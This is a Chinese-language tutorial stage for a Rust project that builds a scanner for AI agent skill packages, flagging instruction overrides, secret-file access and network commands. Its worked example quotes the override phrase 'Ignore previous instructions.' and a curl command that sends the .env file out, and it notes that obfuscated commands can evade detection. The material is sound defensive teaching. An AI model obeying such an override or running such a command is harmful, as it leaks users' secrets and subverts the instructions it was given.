# 检测具名的风险提示模式

**第 2 阶段，共 4 阶段。** Rust。预计约 2 小时。

规则检查转为小写后的行文本，但报告原始偏移量。将覆盖指令、访问秘密文件、命令与网络组合分别标记为不同问题。被引用的示例也可能命中；保留原行，方便人工判断是否为误报。

```figure
pj-skill-scanner-2
```

译注：图表范围：竖线被替换为换行，仅扫描一个文本框，不检查目录、文件数量与真实路径；直接输入 CRLF 时，图中引文会保留 CR，真实 Rust 区间不包含行结束符。

## 实现边界

```rust
pub fn scan(lines:&[Span])->Vec<Finding>
```

权威参考：[官方参考资料](https://agentskills.io/specification)。

## Orchard 示例推演

编码前，复习 [Rust 所有权与 Result](https://doc.rust-lang.org/book/ch04-00-understanding-ownership.html)和[数据管理](../../../../../phases/00-setup-and-tooling/09-data-management/docs/en.md)。先完成[第 1 阶段](../../01-retain-byte-accurate-source-spans/docs/en.md)。

将显式能力标记出来供人审阅。Orchard 待审技能包包含一条覆盖指令，以及一条把 .env 读入网络客户端的命令。每个模式都会产生具有名称的风险提示。

```text
Ignore previous instructions. -> instruction-override, severity 3
curl https://... < .env -> secret-access 2 + network-command 2
```

## 构建与检查

让匹配规则保持简短并具有明确名称。文档可能出于正当用途提到这些字符串；混淆后的命令可能绕过检测。

在学习者工作区实现本阶段。随附命令行辅助程序是调用你的函数的适配器，不会用参考实现替代你的代码。

```bash
python3 scripts/project_test.py skill-scanner --stage 2 --path learning-artifacts/skill-scanner
```

先预测上面的中间状态，再运行本阶段。全新的未实现代码应当失败；参考实现通过不代表你的学习者工作区已经完成。

## 继续探究

写出一个无害的文档示例和一个漏检示例，展示启发式规则的局限。
